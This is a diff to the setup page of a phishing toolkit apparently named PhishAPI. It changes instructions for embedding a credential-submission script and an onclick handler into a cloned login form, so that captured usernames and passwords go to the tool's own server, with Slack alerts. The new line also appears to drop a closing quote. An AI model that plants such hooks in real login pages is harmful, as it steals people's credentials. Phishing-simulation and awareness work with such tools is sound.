@@ -212,13 +212,13 @@ textarea {
 <FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own HTML and Embed the API Tags</FONT><BR><BR>
 <textarea style="text-align:left" class="js-emaillink">
 <!--Add the external script source in the <head> element-->
-<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>
+<script src="https://<?php echo $_SERVER['SERVER_NAME'];?>/APICredentialFormSubmit.js"></script>
 
 <!--Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments-->
-<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">
+<buttom value="Submit!" onclick="SubForm('https://<?php echo $_SERVER['SERVER_NAME'];?>,'NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">
 
 <!--
-PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)
+PhishAPI_URL_HERE = https://<?php echo $_SERVER['SERVER_NAME'];?> (wherever you're hosting the API)
 
 NAME/ID_OF_LOGIN_FORM = Whatever the cloned <form name=""> is set to for the page you cloned
 
